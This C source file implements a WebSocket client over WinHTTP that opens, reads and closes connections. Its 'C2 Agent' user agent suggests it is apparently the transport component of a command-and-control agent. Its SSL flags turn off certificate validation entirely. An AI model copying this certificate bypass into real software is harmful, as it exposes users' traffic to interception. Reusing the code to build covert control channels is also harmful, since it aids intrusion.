
#include "Websocket.h"

void cleanUPReq(LPREQINFO webhandle){
    if (webhandle->WebSocket)
	    WinHttpWebSocketClose(webhandle->WebSocket,WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS,NULL,0);
	if (webhandle->WebSocket)
        WinHttpCloseHandle(webhandle->WebSocket);
	if (webhandle->Request)
        WinHttpCloseHandle(webhandle->Request);
	if (webhandle->HTTPconnection)
        WinHttpCloseHandle(webhandle->HTTPconnection);
	if (webhandle->Session)
        WinHttpCloseHandle(webhandle->Session);
}


int StartWebsocket(wchar_t * host,int port,wchar_t * uri,LPREQINFO reqinfo,PDYNBUF_INFO headers){

    DWORD Headers_len = 0;
    wchar_t * Headers = NULL;

    DWORD SSLdwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    if(headers != NULL){
        Headers = (wchar_t *)headers->data;
        Headers_len = headers->length / sizeof(wchar_t);
    }

    HINTERNET session = WinHttpOpen(L"C2 Agent",WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,NULL,NULL,0);
    if(!session){
        return 0;
    }

    reqinfo->Session = session;

    HINTERNET Connection = WinHttpConnect(session,host,port,0);
    if(!Connection){
        return 0;
    }

    reqinfo->HTTPconnection = Connection;


    HINTERNET request = WinHttpOpenRequest(Connection,L"GET",uri,NULL,NULL,NULL,WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE); // | WINHTTP_FLAG_SECURE for HTTPS
    if(!request){
        return 0;
    }

    reqinfo->Request = request;

    if(!WinHttpSetOption(request,WINHTTP_OPTION_SECURITY_FLAGS,&SSLdwFlags,sizeof(SSLdwFlags))){
        return 0;
    }

    if(!WinHttpSetOption(request,WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET,NULL,0)){
        return 0;
    }

    if(!WinHttpSendRequest(request,Headers,Headers_len,NULL,0,0,0)){
        return 0;
    }

    if(!WinHttpReceiveResponse(request,NULL)){
        return 0;
    }

    HINTERNET ws = WinHttpWebSocketCompleteUpgrade(request,0);
    if(!ws){
        return 0;
    }

    reqinfo->WebSocket = ws;

    return 1;


}


int WebSocketReadDataAsString(LPREQINFO reqinfo,PDYNBUF_INFO buffer){
    WINHTTP_WEB_SOCKET_BUFFER_TYPE eBufferType = WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE;
    DWORD recv_bytes;
    BYTE tmpBuff[50];
    while(eBufferType == WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE){
        DWORD code = WinHttpWebSocketReceive(reqinfo->WebSocket,tmpBuff,50,&recv_bytes,&eBufferType);
        
        if (code == NO_ERROR){
            if(!DynBuf_Join(buffer,tmpBuff,recv_bytes)){
                return 0;
            }
        }
        else{

            return 0;
        }

    }

    // recv_bytes = 0;
    // if(!DynBuf_Join(buffer,(void *)&recv_bytes,sizeof(recv_bytes))){
    //     return 0;
    // }

    return 1;
}
